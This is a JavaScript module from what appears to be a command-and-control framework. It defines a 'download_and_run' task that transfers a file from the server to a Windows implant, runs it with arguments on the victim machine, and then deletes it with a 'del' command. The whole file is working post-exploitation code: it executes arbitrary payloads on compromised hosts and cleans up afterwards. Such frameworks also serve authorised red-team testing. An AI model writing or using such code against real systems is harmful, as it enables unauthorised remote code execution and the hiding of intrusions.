const moduleHelper = require("../../../src/moduleHelper");

// This function returns the module object to be loaded in the database 
exports.load = function (app) {
    var module = {
        name: "windows/admin/download_and_run",
        options: {
            file: {
                value: "",
                required: true,
                description: "The ID of the file to download"
            },
            path: {
                value: "C:\\Temp",
                required: true,
                description: "The path to download the file to"
            },
            arguments:{
                value: "",
                required: false,
                description: "The arguments to execute the program with"
            },
            implant:{
                value: "",
                required: true,
                description: "The ID of the implant"
            }
        },
        supportedOS: ["windows"],

        description: "Downloads and runs a file on the target implant",

        requiredPayloads: ["command", "download"]
    }
    return module;
};

// This is the first function to be called when the module is ran
exports.run = async function (app, run) {
    try{
        var file = await app.service("/fs/files").get(run.options.file.value).catch(() => {});
        if (!file){
            moduleHelper.logError(app,run, "File not found");
            moduleHelper.fail(app, run);
            return;
        }

        // Creating the job and setting the callback
        var job = await moduleHelper.createJobWithPipe(app,run,"afterDownload" ,
            {type:"download", 
            options:{ 
                file: file.filename, 
                filename: file.filename,
                length: file.length, 
                path: run.options.path.value
                }
            },
            {type: "download",
                    source: file._id, 
                    destination: file,
                    implantId: run.options.implant.value
            });

        if(!job){
            moduleHelper.logError(app, run, "Error Creating Download Job");
            moduleHelper.fail(app, run);
            return;
        }
        moduleHelper.logInfo(app, run, "Requested the download of: " + file.filename);
        moduleHelper.inProgress(app, run);
    }catch(err){
        console.log(err);
        moduleHelper.logError(app,run,err.message);
        moduleHelper.fail(app, run);
        return;
    }
};

// There are callback than can be executed once jobs are completed
exports.afterDownload = async function (app, run, job) {
    // If job failed
    if(job.jobStatus == 4 ){
        moduleHelper.logError(app, run, "Error during download: " + job.result);
        moduleHelper.fail(app, run);
        return;
    }
    // We can add variables to the run
    run.filepath = job.result;
    var job2 = await moduleHelper.createJob(app,run,"afterExecute", {type:"command", options:{cmd: job.result + " " + run.options.arguments.value}}).catch(() => {});
    if(!job2){
        moduleHelper.logError(app, run, "Error Creating Command Job");
        moduleHelper.fail(app, run);
        return;
    }
    moduleHelper.logSuccess(app, run, "Download succeeded, executing: " + job.result + " " + run.options.arguments.value);

    // Let's remember to save the run (to save the variables)
    moduleHelper.inProgress(app, run);
};

// There are callback than can be executed once jobs are completed
exports.afterExecute = async function (app, run, job) {
    // If job failed
    if(job.jobStatus == 4 ){
        moduleHelper.logError(app, run, "Error during Execute, trying to delete:\r\n" + job.result);
    }else{
        moduleHelper.logSuccess(app, run, "Successfully executed command: \r\n" + job.result);
    }
    var job2 = await moduleHelper.createJob(app,run,"afterDelete" ,{type:"command", options:{cmd: "del " + run.filepath}}).catch(() => {});
    if(!job2){
        moduleHelper.logError(app, run, "Error Creating Delete Job, file must be deleted manually");
        moduleHelper.fail(app, run);
        return;
    }

};

// There are callback than can be executed once jobs are completed
exports.afterDelete = async function (app, run, job) {
    // If job failed
    if(job.jobStatus == 4 ){
        moduleHelper.logError(app, run, "Error during delete, file must be deleted manually: \r\n"+ job.result);
        moduleHelper.fail(app, run);
    }else{
        moduleHelper.logSuccess(app, run, "Successfully deleted file");
        moduleHelper.success(app, run);
    }

};